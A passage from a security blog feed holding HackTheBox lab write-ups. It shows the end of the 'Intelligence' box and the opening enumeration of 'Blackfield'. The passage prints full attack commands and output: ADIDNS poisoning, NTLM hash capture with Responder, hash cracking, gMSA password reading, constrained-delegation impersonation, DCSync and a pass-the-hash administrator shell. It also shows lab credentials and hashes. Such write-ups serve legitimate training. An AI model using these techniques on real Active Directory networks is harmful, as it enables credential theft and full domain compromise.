<p>According to <a href="https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/">this blog</a>, in AD, by default, any authenticated users can create a new DNS record (ADIDNS). The idea here is we try to create a subdomain record under <code>intelligence.htb</code> that starts with <code>web*</code>. So when the script (<code>downdetector.ps1</code>) runs, it might hit the record we created and perform NTLM authentication since the <code>Invoke-WebRequest</code> issued with the <code>-UseDefaultCredentials</code> flag.</p>
<p>Fortunately, a well-known security researcher, <a href="https://dirkjanm.io/">Dirk-jan</a> has already created a tool called <code>dnstool.py</code> to interact with ADIDNS which bundled with Krbrelayx repository, hence I&rsquo;ll clone it first.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «/opt» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ git clone https://github.com/dirkjanm/krbrelayx.git <span class="o">&amp;&amp;</span> <span class="nb">cd</span> krbrelayx
</span></span><span class="line"><span class="cl">Cloning into <span class="s1">&#39;krbrelayx&#39;</span>...
</span></span><span class="line"><span class="cl">remote: Enumerating objects: 98, <span class="k">done</span>.
</span></span><span class="line"><span class="cl">remote: Total <span class="m">98</span> <span class="o">(</span>delta 0<span class="o">)</span>, reused <span class="m">0</span> <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused <span class="m">98</span>
</span></span><span class="line"><span class="cl">Receiving objects: 100% <span class="o">(</span>98/98<span class="o">)</span>, 65.76 KiB <span class="p">|</span> 426.00 KiB/s, <span class="k">done</span>.
</span></span><span class="line"><span class="cl">Resolving deltas: 100% <span class="o">(</span>48/48<span class="o">)</span>, <span class="k">done</span>.
</span></span></code></pre></div><p>Now I can add a new record that points to my box IP with the following command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «krbrelayx» «10.10.14.75» git:<span class="o">(</span>master<span class="o">)</span> 
</span></span><span class="line"><span class="cl">$ python3 dnstool.py -u intelligence.htb<span class="se">\\</span>Tiffany.Molina -p <span class="s1">&#39;NewIntelligenceCorpUser9876&#39;</span> -r <span class="s1">&#39;web-iamf.intelligence.htb&#39;</span> -a add -d 10.10.14.75 10.10.10.248 
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Connecting to host...
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Binding to host
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Bind OK
</span></span><span class="line"><span class="cl">/opt/krbrelayx/dnstool.py:241: DeprecationWarning: please use dns.resolver.Resolver.resolve<span class="o">()</span> instead
</span></span><span class="line"><span class="cl">  <span class="nv">res</span> <span class="o">=</span> dnsresolver.query<span class="o">(</span>zone, <span class="s1">&#39;SOA&#39;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Adding new record
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> LDAP operation completed successfully
</span></span></code></pre></div><p>At the same time, I&rsquo;ll also start the Responder. Shortly after it runs, the Ted.Graves hash appear.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «krbrelayx» «10.10.14.75» git:<span class="o">(</span>master<span class="o">)</span> 
</span></span><span class="line"><span class="cl">$ sudo responder -I tun0
</span></span><span class="line"><span class="cl">                                         __
</span></span><span class="line"><span class="cl">  .----.-----.-----.-----.-----.-----.--<span class="p">|</span>  <span class="p">|</span>.-----.----.
</span></span><span class="line"><span class="cl">  <span class="p">|</span>   _<span class="p">|</span>  -__<span class="p">|</span>__ --<span class="p">|</span>  _  <span class="p">|</span>  _  <span class="p">|</span>     <span class="p">|</span>  _  <span class="o">||</span>  -__<span class="p">|</span>   _<span class="p">|</span>
</span></span><span class="line"><span class="cl">  <span class="p">|</span>__<span class="p">|</span> <span class="p">|</span>_____<span class="p">|</span>_____<span class="p">|</span>   __<span class="p">|</span>_____<span class="p">|</span>__<span class="p">|</span>__<span class="p">|</span>_____<span class="o">||</span>_____<span class="p">|</span>__<span class="p">|</span>
</span></span><span class="line"><span class="cl">                   <span class="p">|</span>__<span class="p">|</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">           NBT-NS, LLMNR <span class="p">&amp;</span> MDNS Responder 3.0.6.0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  Author: Laurent Gaffie <span class="o">(</span>laurent.gaffie@gmail.com<span class="o">)</span>
</span></span><span class="line"><span class="cl">  To <span class="nb">kill</span> this script hit CTRL-C
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Listening <span class="k">for</span> events...                                                                                                          
</span></span><span class="line"><span class="cl"><span class="o">[</span>HTTP<span class="o">]</span> NTLMv2 Client   : 10.10.10.248
</span></span><span class="line"><span class="cl"><span class="o">[</span>HTTP<span class="o">]</span> NTLMv2 Username : intelligence<span class="se">\T</span>ed.Graves
</span></span><span class="line"><span class="cl"><span class="o">[</span>HTTP<span class="o">]</span> NTLMv2 Hash     : Ted.Graves::intelligence:4cca110e84677c33:3A689C04E699DF8F6E1B16A599576ABA:0101000000000000E700D4082B7AD7012AF2C454A91E32400000000002000800340039003100540001001E00570049004E002D00500032003300360049003800390058003100530046000400140034003900310054002E004C004F00430041004C0003003400570049004E002D00500032003300360049003800390058003100530046002E0034003900310054002E004C004F00430041004C000500140034003900310054002E004C004F00430041004C000800300030000000000000000000000000200000AF0854B4C9903CBE8251A0173036E36C4E1F4A5399C97563C3922EC707733A310A0010000000000000000000000000000000000009003C0048005400540050002F007700650062002D00690061006D0066002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
</span></span></code></pre></div><h4 id="cracking-the-hash">Cracking the Hash</h4>
<p>The hash can be cracked with <code>hashcat</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ ./hashcat.exe -m <span class="m">5600</span> hashes/intelligence-ted.graves.hash ../../rockyou.txt -O                     ✘ INT
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">TED.GRAVES::intelligence:4cca110e84677c33:3a689c04e699df8f6e1b16a599576aba:..<span class="o">[</span>SNIP<span class="o">]</span>..:Mr.Teddy
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Session..........: hashcat
</span></span><span class="line"><span class="cl">Status...........: Cracked
</span></span><span class="line"><span class="cl">Hash.Name........: NetNTLMv2
</span></span><span class="line"><span class="cl">Hash.Target......: TED.GRAVES::intelligence:4cca110e84677c33:3a689c04e...000000
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>The credentials are valid</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ crackmapexec smb 10.10.10.248 -u <span class="s1">&#39;Ted.Graves&#39;</span> -p <span class="s1">&#39;Mr.Teddy&#39;</span> 
</span></span><span class="line"><span class="cl">SMB         10.10.10.248    <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:intelligence.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</span></span></code></pre></div><h3 id="shell-as-administrator">Shell as Administrator</h3>
<h4 id="enumeration-bloodhound">Enumeration BloodHound</h4>
<p>Even with user <code>Ted.Graves</code>, I still have no shell access. From here, I&rsquo;ll use BloodHound to explore more about the object relationships. I&rsquo;ll  use the Python ingestor.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «BloodHound.py» «10.10.14.75» git:<span class="o">(</span>master<span class="o">)</span> 
</span></span><span class="line"><span class="cl">$ python3 bloodhound.py -c All -u <span class="s1">&#39;Ted.Graves&#39;</span> -p <span class="s1">&#39;Mr.Teddy&#39;</span> -d intelligence.htb -dc dc.intelligence.htb -ns 10.10.10.248
</span></span><span class="line"><span class="cl">INFO: Found AD domain: intelligence.htb
</span></span><span class="line"><span class="cl">INFO: Connecting to LDAP server: dc.intelligence.htb
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">1</span> domains
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">1</span> domains in the forest
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">2</span> computers
</span></span><span class="line"><span class="cl">INFO: Connecting to LDAP server: dc.intelligence.htb
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">42</span> users
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">54</span> groups
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">0</span> trusts
</span></span><span class="line"><span class="cl">INFO: Starting computer enumeration with <span class="m">10</span> workers
</span></span><span class="line"><span class="cl">INFO: Querying computer: svc_int.intelligence.htb
</span></span><span class="line"><span class="cl">INFO: Querying computer: dc.intelligence.htb
</span></span><span class="line"><span class="cl">INFO: Skipping enumeration <span class="k">for</span> svc_int.intelligence.htb since it could not be resolved.
</span></span><span class="line"><span class="cl">INFO: Done in 00M 21S
</span></span></code></pre></div><p>Using the pre-built analytics queries “Shortest Path from Owned Principal” reveals that user <code>Ted.Graves</code> has <code>readGMSAPassword</code> permission on a service account called SVC_INT. And the service account has <code>AllowedToDelegate</code> permission (constrained delegation) on the DC/Machine.</p>
<p><div class="img-container"><img src="imgs/image-20210716110136841.png" alt="image-20210716110136841"  /></div>
</p>
<h4 id="read-svc_init-password">Read SVC_INIT Password</h4>
<p>According to the help, <code>readGMSAPassword</code> allows you to retrieve GMSA (Group Managed Service Account) password. I&rsquo;ll also note that the password might be changed after some periods.</p>
<p><div class="img-container"><img src="imgs/image-20210716110314851.png" alt="image-20210716110314851"  /></div>
</p>
<p>The author of this box already created a tool for abusing this permission: <a href="https://github.com/micahvandeusen/gMSADumper/blob/main/gMSADumper.py">gMSADumper.py</a>. Running it retuns the password of svc_int in the form of NT hash. Since the password is managed by the DC, I don&rsquo;t have to try to crack it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ ./gMSADumper.py -u <span class="s1">&#39;Ted.Graves&#39;</span> -p <span class="s1">&#39;Mr.Teddy&#39;</span> -d intelligence.htb
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Users or groups who can <span class="nb">read</span> password <span class="k">for</span> svc_int$:
</span></span><span class="line"><span class="cl"> &gt; DC$
</span></span><span class="line"><span class="cl"> &gt; itsupport
</span></span><span class="line"><span class="cl">svc_int$:::d64b83fe606e6d3005e20ce0ee932fe2
</span></span></code></pre></div><h4 id="abusing-constrained-delegation-silver-ticket">Abusing Constrained Delegation: Silver Ticket</h4>
<p><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation">This site</a> explains what a constrained delegation is:</p>
<blockquote>
<p>If you have compromised a user account or a computer (machine account) that has kerberos constrained delegation enabled, it&rsquo;s possible to impersonate any domain user (including administrator) and authenticate to a service that the user account is trusted to delegate to.</p>
</blockquote>
<p>In this case, the service account <code>svc_int</code> can authenticate to <code>WWW/DC.INTELLIGENCE.HTB</code> as any domain user.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ ldapsearch -LLL -D <span class="s2">&#34;Ted.Graves@intelligence.htb&#34;</span> -w <span class="s2">&#34;Mr.Teddy&#34;</span> -x -h 10.10.10.248 -b <span class="s2">&#34;CN=svc_int,CN=Managed ServiceDC=intelligence,DC=htb&#34;</span> 
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">msDS-AllowedToDelegateTo: WWW/dc.intelligence.htb
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>The goal here is to impersonate the administrator account and obtain its ticket cache (Silver Ticket). For this, I&rsquo;ll use <code>impacket-getST</code> tool, but the result says clock skew too great.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ impacket-getST <span class="s1">&#39;intelligence.htb/svc_int$&#39;</span>  -spn <span class="s1">&#39;WWW\dc.intelligence.htb&#39;</span> -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate administrator
</span></span><span class="line"><span class="cl">Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Getting TGT <span class="k">for</span> user
</span></span><span class="line"><span class="cl">Kerberos SessionError: KRB_AP_ERR_SKEW<span class="o">(</span>Clock skew too great<span class="o">)</span>
</span></span></code></pre></div><p>To resolve that, I&rsquo;ll need to synchronize my time with the DC using <code>ntpdate</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ sudo apt install ntpdate    
</span></span><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ sudo ntpdate 10.10.10.248
</span></span><span class="line"><span class="cl"><span class="m">18</span> Jul 14:57:39 ntpdate<span class="o">[</span>63324<span class="o">]</span>: adjust <span class="nb">time</span> server 10.10.10.248 offset +0.001305 sec
</span></span></code></pre></div><p>On the next attempt, I have obtained the admin ticket.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75»
</span></span><span class="line"><span class="cl">$ impacket-getST -spn <span class="s1">&#39;WWW/dc.intelligence.htb&#39;</span> -impersonate administrator -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -dc-ip 10.10.10.248 intelligence.htb/svc_int<span class="se">\$</span>
</span></span><span class="line"><span class="cl">Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Getting TGT <span class="k">for</span> user
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Impersonating administrator
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>     Requesting S4U2self
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>     Requesting S4U2Proxy
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving ticket in administrator.ccache
</span></span></code></pre></div><h4 id="dcsync">DCSync</h4>
<p>Now I can use the ticket for things like DCSync.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ <span class="nv">KRB5CCNAME</span><span class="o">=</span>administrator.ccache
</span></span><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ impacket-secretsdump -k -no-pass dc.intelligence.htb -just-dc-user administrator
</span></span><span class="line"><span class="cl">Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span>id:rid:lmhash:nthash<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
</span></span><span class="line"><span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:9075113fe16cf74f7c0f9b27e882dad3:::
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Kerberos keys grabbed
</span></span><span class="line"><span class="cl">Administrator:aes256-cts-hmac-sha1-96:75dcc603f2d2f7ab8bbd4c12c0c54ec804c7535f0f20e6129acc03ae544976d6
</span></span><span class="line"><span class="cl">Administrator:aes128-cts-hmac-sha1-96:9091f2d145cb1a2ea31b4aca287c16b0
</span></span><span class="line"><span class="cl">Administrator:des-cbc-md5:2362bc3191f23732
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Cleaning up...
</span></span></code></pre></div><h4 id="shell-access">Shell Access</h4>
<p>With the administrator hash, I can use WinRM to get a shell access</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ evil-winrm -i 10.10.10.248 -u <span class="s1">&#39;administrator&#39;</span> -H <span class="s1">&#39;9075113fe16cf74f7c0f9b27e882dad3&#39;</span>        
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Evil-WinRM shell v2.4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; hostname
</span></span><span class="line"><span class="cl">dc
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; ipconfig
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Windows IP Configuration
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Ethernet adapter Ethernet0 2:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Connection-specific DNS Suffix  . :
</span></span><span class="line"><span class="cl">   IPv6 Address. . . . . . . . . . . : dead:beef::a57a:d94f:fa40:87e6
</span></span><span class="line"><span class="cl">   Link-local IPv6 Address . . . . . : fe80::a57a:d94f:fa40:87e6%6
</span></span><span class="line"><span class="cl">   IPv4 Address. . . . . . . . . . . : 10.10.10.248
</span></span><span class="line"><span class="cl">   Subnet Mask . . . . . . . . . . . : 255.255.254.0
</span></span><span class="line"><span class="cl">   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%6
</span></span><span class="line"><span class="cl">                                       10.10.10.2
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Blackfield</title>
      <link>https://fahmifj.github.io/hackthebox/blackfield/</link>
      <pubDate>Tue, 04 May 2021 14:28:21 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/blackfield/</guid>
      <description>Abusing Backup Operators group to dump Active Directory database</description>
      <content:encoded><![CDATA[<p>Blackfield begins with collecting a list of usernames from an SMB share. With these usernames, I&rsquo;m able to perform AS-REP roasting attack and obtain a TGT of a helpdesk account. The helpdesk account can be used to reset the password of an audit account. Re-enumerating SMB shares using the audit account finds a memory dump file of LSASS. The dump file contains an NT hash of a service account that is a member of Backup Operators. The privileges of the Backup Operators group can be abused to create a volume shadow copy and pull the <code>NTDS.dit</code> file from there. The <code>NTDS.dit</code> file can be extracted to retrieve the NT hash of the administrator account, and that hash can be used for remote access with administrative privilege.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>AS-REP roasting</li>
<li>LDAP enumeration</li>
<li>BloodHound</li>
<li>Abusing Windows Access Tokens - SeBackupPrivilege</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>SMBMap</li>
<li>ldapdomaindump</li>
<li>CrackMapExec</li>
<li><a href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a></li>
<li><a href="https://github.com/fox-it/BloodHound.py">BloodHound.py</a></li>
<li><a href="https://github.com/giuliano108/SeBackupPrivilege">SeBackupPrivilege CmdLets</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>An initial TCP scan with <code>nmap</code> discovers at least seven open ports. These ports are the typical port used by Active Directory Domain Controller (AD DC).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «blackfield» «10.10.14.169»
</span></span><span class="line"><span class="cl">$ nmap -sC -sV -oN initial-blackfield 10.10.10.192
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> blackfield.htb <span class="o">(</span>10.10.10.192<span class="o">)</span>
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.054s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">53/tcp open domain?
</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
</span></span><span class="line"><span class="cl"><span class="p">|</span> DNSVersionBindReqTCP: 
</span></span><span class="line"><span class="cl"><span class="p">|</span> version
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ <span class="nb">bind</span>
</span></span><span class="line"><span class="cl">88/tcp open kerberos-sec Microsoft Windows Kerberos <span class="o">(</span>server time: 2020–10–04 10:53:38Z<span class="o">)</span>
</span></span><span class="line"><span class="cl">135/tcp open msrpc Microsoft Windows RPC
</span></span><span class="line"><span class="cl">389/tcp open ldap Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: BLACKFIELD.local0., Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl">445/tcp open microsoft-ds?
</span></span><span class="line"><span class="cl">593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
</span></span><span class="line"><span class="cl">3268/tcp open ldap Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: BLACKFIELD.local0., Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span class="line"><span class="cl">SF-Port53-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>10/3%Time<span class="o">=</span>5F794746%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>DNSV
</span></span><span class="line"><span class="cl">SF:ersionBindReqTCP,20,<span class="s2">&#34;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:x04bind\0\0\x10\0\x03&#34;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">Service Info: Host: DC01<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class="line"><span class="cl">Host script results:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: 6h59m59s
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
</span></span><span class="line"><span class="cl"><span class="p">|</span> 2.02: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ Message signing enabled and required
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
</span></span><span class="line"><span class="cl"><span class="p">|</span> date: 2020–10–04T10:55:58
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ start_date: N/A
</span></span></code></pre></div><p>I will summarize the results:</p>
<ul>
<li>There is a DNS service on port 53, but HTB box is a single machine, so enumerating this service is not priority.</li>
<li>There is a Kerberos service on port 88 is running Kerberos. I can try AS-REP roasting here.</li>
<li>There is MS-RPC service on port 135, which I don&rsquo;t touch it really often, so I&rsquo;ll lower the priority.</li>
<li>There is an LDAP service on port 389, LDAP is the standard protocol for directory services. Active Directory is Microsoft&rsquo;s implementation of directory services and it supports LDAP query.</li>
<li>There is an SMB service on port 445. I can try anonymous login here.</li>
<li>Port 3268 is running LDAP as well, but it&rsquo;s used as <a href="https://social.technet.microsoft.com/Forums/Lync/en-US/e52b9154-b93a-4a3b-b6f2-0285f932da14/389-and-3268-port-difference?forum=winserverDS">global catalog</a> (read more: <a href="https://www.techopedia.com/definition/25429/global-catalog-gc">here</a>).</li>
</ul>
<p><code>nmap</code> also identified the AD domain name to be <code>blackfield.local</code>.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-389---ldap">TCP 389 - LDAP</h3>
<p>On LDAP, I can send a query to obtain the domain metadata, but first I&rsquo;ll look into the rootDSE<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup> to retrieve a list of the domain naming context.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «blackfield» «10.10.14.169»
</span></span><span class="line"><span class="cl">$ ldapsearch -LLL -x -h 10.10.10.192 -s base namingContexts
</span></span><span class="line"><span class="cl">dn:
</span></span><span class="line"><span class="cl">namingcontexts: <span class="nv">DC</span><span class="o">=</span>BLACKFIELD,DC<span class="o">=</span><span class="nb">local</span>
</span></span><span class="line"><span class="cl">namingcontexts: <span class="nv">CN</span><span class="o">=</span>Configuration,DC<span class="o">=</span>BLACKFIELD,DC<span class="o">=</span><span class="nb">local</span>
</span></span><span class="line"><span class="cl">namingcontexts: <span class="nv">CN</span><span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>BLACKFIELD,DC<span class="o">=</span><span class="nb">local</span>
</span></span><span class="line"><span class="cl">namingcontexts: <span class="nv">DC</span><span class="o">=</span>DomainDnsZones,DC<span class="o">=</span>BLACKFIELD,DC<span class="o">=</span><span class="nb">local</span>
</span></span><span class="line"><span class="cl">namingcontexts: <span class="nv">DC</span><span class="o">=</span>ForestDnsZones,DC<span class="o">=</span>BLACKFIELD,DC<span class="o">=</span><span class="nb">local</span>
</span></span></code></pre></div><ul>
<li>
<p><code>-LLL</code>: removes every comments in the output</p>
</li>
<li>
<p><code>-x</code>: do simple authentication</p>
</li>
<li>
<p><code>-h</code>: hostname or IP</p>
</li>
<li>
<p><code>-s</code>: search scope, <code>base</code> will returns the contents of <a href="https://docs.microsoft.com/en-us/windows/win32/adschema/rootdse">rootDSE</a>.</p>
</li>
</ul>
<p>I can use <code>DC=BLACKFIELD,DC=local</code> (this is called as <em>distinguished name</em>), but unfortunately the anonymous bind is not allowed.</p>
<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>Trying anonymous login with <code>crackmapexec</code> returns a status access denied.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «blackfield» «10.10.14.169»
</span></span><span class="line"><span class="cl">$ crackmapexec smb 10.10.10.192 -u <span class="s1">&#39;&#39;</span> -p <span class="s1">&#39;&#39;</span> --shares
</span></span><span class="line"><span class="cl">SMB         10.10.10.192    <span class="m">445</span>    DC01             <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">17763</span> <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</span></span><span class="line"><span class="cl">SMB         10.10.10.192    <span class="m">445</span>    DC01             <span class="o">[</span>-<span class="o">]</span> BLACKFIELD.local<span class="se">\:</span> STATUS_ACCESS_DENIED
</span></span><span class="line"><span class="cl">SMB         10.10.10.192    <span class="m">445</span>    DC01             <span class="o">[</span>-<span class="o">]</span> Error enumerating shares: STATUS_ACCESS_DENIED
</span></span></code></pre></div><p>But on using <code>smbclient</code>, it return the shares list.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «blackfield» «10.10.14.169»
</span></span><span class="line"><span class="cl">$ smbclient -N -L //10.10.10.192/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        Sharename       Type      Comment
</span></span><span class="line"><span class="cl">        ---------       ----      -------
</span></span><span class="line"><span class="cl">        ADMIN$          Disk      Remote Admin
</span></span><span class="line"><span class="cl">        C$              Disk      Default share
</span></span><span class="line"><span class="cl">        forensic        Disk      Forensic / Audit share.
</span></span><span class="line"><span class="cl">        IPC$            IPC       Remote IPC
</span></span><span class="line"><span class="cl">        NETLOGON        Disk      Logon server share
</span></span><span class="line"><span class="cl">        profiles$       Disk
</span></span><span class="line"><span class="cl">        SYSVOL          Disk      Logon server share
</span></span><span class="line"><span class="cl">Reconnecting with SMB1 <span class="k">for</span> workgroup listing.
</span></span><span class="line"><span class="cl">do_connect: Connection <span class="k">for</span> 10.10.10.192 failed <span class="o">(</span>Error NT_STATUS_IO_TIMEOUT<span class="o">)</span>
</span></span><span class="line"><span class="cl">Unable to connect with SMB1 -- no workgroup available
</span></span></code></pre></div><p>Later, I came to know that ‘anonymous’ must be specified in <code>crackmapexec</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210504155151284.png" alt="image-20210504155151284"  /></div>
</p>
<h4 id="profiles-share">profiles$ share</h4>
